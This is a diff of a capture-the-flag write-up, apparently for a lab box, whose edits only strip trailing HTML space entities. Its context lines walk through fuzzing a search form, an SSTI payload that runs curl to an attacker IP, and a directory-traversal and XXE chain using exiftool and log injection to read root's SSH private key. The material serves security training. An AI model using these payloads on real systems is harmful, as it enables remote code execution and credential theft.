@@ -28,14 +28,14 @@ When we search for something, it shows our result back on the screen:
 There are a few possibilities in my mind:
 
 * XSS -> But there's no users present to 'view' our requests
-* SQL Injection -> Might have a database present, but not typical for non-logins.&#x20;
+* SQL Injection -> Might have a database present, but not typical for non-logins.
 * SSTI
 
 When we use `${7*7}`, we get a unique error:
 
 <figure><img src="../../../.gitbook/assets/image (2175).png" alt=""><figcaption></figcaption></figure>
 
-It seems that some characters are being blocked. We can fuzz this using `wfuzz`.&#x20;
+It seems that some characters are being blocked. We can fuzz this using `wfuzz`.
 
 ```
 $ wfuzz -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt  -u http://10.129.227.207:8080/search -d name=FUZZ --sl=0 /usr/lib/python3/dist-packages/wfuzz/__init__.p:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -82,7 +82,7 @@ These characters are banned, but the rest are not. This is what happens when I u
 
 <figure><img src="../../../.gitbook/assets/image (2063).png" alt=""><figcaption></figcaption></figure>
 
-This confirms that SSTI works, and the payload was taken from a Freemarker cheat sheet, meaning the page runs in Java (but not necessarily FreeMarker!). We can use this payload after replacing the `$` with `*` because `#` doesn't seem to work.&#x20;
+This confirms that SSTI works, and the payload was taken from a Freemarker cheat sheet, meaning the page runs in Java (but not necessarily FreeMarker!). We can use this payload after replacing the `$` with `*` because `#` doesn't seem to work.
 
 <pre><code><strong>*{T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.13/sstirce')}
 </strong></code></pre>
@@ -123,7 +123,7 @@ The first thing I noticed was we are part of the `logs` group. We can use the `f
 /opt/panda_search/redpanda.log
 </code></pre>
 
-The `/credits` directory contains XML files with the number of views that each Artist got for their respective images. However, the `/opt` directory has some interesting stuff.&#x20;
+The `/credits` directory contains XML files with the number of views that each Artist got for their respective images. However, the `/opt` directory has some interesting stuff.
 
 ```
 woodenk@redpanda:/opt$ ll
@@ -138,7 +138,7 @@ drwxrwxr-x  5 root root 4096 Jun 14  2022 panda_search/
 
 `credit-score` was a new thing. Within it there were a lot of directories leading to an `App.java` file that contains source code for it. We can break it down here.
 
-It firsts takes a string and splits it into 3 portions, and only the last one is important.&#x20;
+It firsts takes a string and splits it into 3 portions, and only the last one is important.
 
 ```java
 public static Map parseLog(String line) {
@@ -152,7 +152,7 @@ public static Map parseLog(String line) {
     }
 ```
 
-After parsing the string (`uri`), it checks to see which Artist has an image matching the query. The `uri` variable is passed into the `fullpath` variable without sanitisation, making it vulnerable to directory traversal if we can control it. The Artist variable is embedded in the metadata of the image, which is also controllable.&#x20;
+After parsing the string (`uri`), it checks to see which Artist has an image matching the query. The `uri` variable is passed into the `fullpath` variable without sanitisation, making it vulnerable to directory traversal if we can control it. The Artist variable is embedded in the metadata of the image, which is also controllable.
 
 ```java
 public static String getArtist(String uri) throws IOException, JpegProcessingException
@@ -204,7 +204,7 @@ public static void addViewTo(String path, String uri) throws JDOMException, IOEx
     }
 ```
 
-The goal here is to somehow pass an XML file that we control to the `addViewTo` function that has a malicious XML payload. The function above does not seem to check or verify the XML that is passed to it, so I'll be trying to read the `/root/.ssh/id_rsa` file.&#x20;
+The goal here is to somehow pass an XML file that we control to the `addViewTo` function that has a malicious XML payload. The function above does not seem to check or verify the XML that is passed to it, so I'll be trying to read the `/root/.ssh/id_rsa` file.
 
 Here's the XML file that I constructed:
 
@@ -300,7 +300,7 @@ $ exiftool -Artist="../tmp/read" lazy.jpg
     1 image files updated
 ```
 
-The reason we are using this is because the XML files would be read from `/credits../tmp/read.xml` after a single `../`. Then we need to transfer our XML file over as `read_creds.xml`.&#x20;
+The reason we are using this is because the XML files would be read from `/credits../tmp/read.xml` after a single `../`. Then we need to transfer our XML file over as `read_creds.xml`.
 
 Afterwards, we can create our malicious string based on the template and drop it into `/opt/panda_search/redpanda.log`:
 
@@ -308,7 +308,7 @@ Afterwards, we can create our malicious string based on the template and drop it
 echo 'a||aa||aa||../../../../../../../../../../../../../tmp/read.jpg' >> redpanda.log
 ```
 
-Then we wait for a little bit, then read the `read_creds.xml` file to find the `root` SSH key.&#x20;
+Then we wait for a little bit, then read the `read_creds.xml` file to find the `root` SSH key.
 
 <figure><img src="../../../.gitbook/assets/image (3566).png" alt=""><figcaption></figcaption></figure>
 
